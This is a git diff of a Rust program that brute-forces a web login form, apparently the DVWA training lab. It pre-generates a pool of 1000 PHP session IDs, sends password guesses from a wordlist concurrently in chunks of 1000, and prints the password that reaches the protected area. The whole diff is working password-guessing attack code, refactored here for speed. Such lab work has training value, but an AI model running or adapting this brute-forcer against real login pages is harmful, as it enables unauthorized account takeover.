@@ -47,11 +47,9 @@ fn extract_phpsessid(response: &reqwest::Response) -> String {
     phpsessid.expect("No php session id in response")
 }
 
-async fn try_password(
+async fn generate_sess_id(
     client: &reqwest::Client,
-    password: String,
-    index: usize
-)-> Result<(), Box<dyn Error + Send + Sync>> {
+) -> Result<String, Box<dyn Error + Send + Sync>> {
     let mut user_token = String::new();
     let mut phpsessid = String::new();
     while user_token.is_empty() {
@@ -82,9 +80,18 @@ async fn try_password(
             ("user_token", &user_token)
         ])
         .send().await?;
+    Ok(phpsessid)
+}
 
-    // let phpsessid = extract_phpsessid(&response);
-
+fn try_password(
+    client: &reqwest::Client,
+    password: String,
+    index: usize,
+    phpsessid: String,
+) -> Result<
+    tokio::task::JoinHandle<Result<(), Box<dyn Error + Send + Sync>>>,
+    Box<dyn Error + Send + Sync>
+> {
     // Create headers with PHPSESSID cookie
     let mut headers = HeaderMap::new();
     // Combine both cookies into a single header value
@@ -103,7 +110,7 @@ async fn try_password(
     let password = password.clone();
     // NOTE: This part causes a timeout, which is why we do this on an asynchronous
     // thread
-    tokio::spawn(async move {
+    let handle = tokio::spawn(async move {
         loop {
             let response = client_clone
                 .get(&payload)
@@ -112,23 +119,21 @@ async fn try_password(
 
             let response_text = response.text().await?;
 
-            // println!("Handled: {} => {}", index, response_text);
-
             // Check if login was successful
             if response_text.contains("Welcome to the password protected area") {
                 println!("Found password: {}", password);
                 std::process::exit(0);
             }
             else if response_text.contains("Username and/or password incorrect.") {
-                println!("no password found for: {}", index);
-                return Ok::<Option<String>, Box<dyn Error + Send + Sync>>(None);
+                // println!("no password found for: {}", index);
+                return Ok(())
             } else {
                 // println!("fucked up, retrying...");
                 tokio::time::sleep(Duration::from_millis(100)).await;
             }
         }
     });
-    Ok(())
+    Ok(handle)
 }
 
 #[tokio::main]
@@ -145,19 +150,62 @@ pub async fn run() -> Result<(), Box<dyn Error>> {
     let client = reqwest::Client::builder()
         .pool_idle_timeout(std::time::Duration::from_secs(30))
         .build()?;
-    for (index, password) in passwords.into_iter().enumerate() {
-        loop {
-            match try_password(
-                &client,
-                password.clone(),
-                index,
-            ).await {
-                Err(e) => {
-                    println!("Failed with error {:?}... retrying now", e);
-                    continue;
-                },
-                _ => break,
+
+    let mut sess_ids = Vec::new();
+
+    while sess_ids.len() < 1000 {
+        match generate_sess_id(&client).await {
+            Ok(sess_id) => sess_ids.push(sess_id),
+            Err(e) => {
+                println!("Failed to generate session id with error {:?}... retrying now", e);
+                continue;
             }
+        }
+    }
+
+    let mut handles = Vec::new();
+    let chunk_size = 1000;
+    for (chunk_index, chunk) in passwords.chunks(chunk_size).enumerate() {
+        use std::time::Instant;
+
+        let chunk_start_time = Instant::now();
+
+        for (index, password) in chunk.iter().enumerate() {
+            loop {
+                match try_password(
+                    &client,
+                    password.clone(),
+                    chunk_index * chunk_size + index,
+                    sess_ids[(chunk_index * chunk_size + index) % sess_ids.len()].clone()
+                ) {
+                    Err(e) => {
+                        println!("Failed with error {:?}... retrying now", e);
+                        continue;
+                    },
+                    Ok(handle) => {
+                        handles.push(handle);
+                        break;
+                    },
+                }
+            }
+        }
+        while let Some(handle) = handles.pop() {
+            if let Err(e) = handle.await {
+                println!("A task failed with error: {:?}", e);
+            }
+        }
+        let chunk_duration = chunk_start_time.elapsed();
+        let start_index = chunk_index * chunk_size;
+        let end_index = start_index + chunk.len() - 1;
+        println!(
+            "Handled passwords range: {}-{}, Took: {:?}",
+            start_index, end_index, chunk_duration
+        );
+    }
+
+    for handle in handles {
+        if let Err(e) = handle.await {
+            println!("A task failed with error: {:?}", e);
         }
     }
 
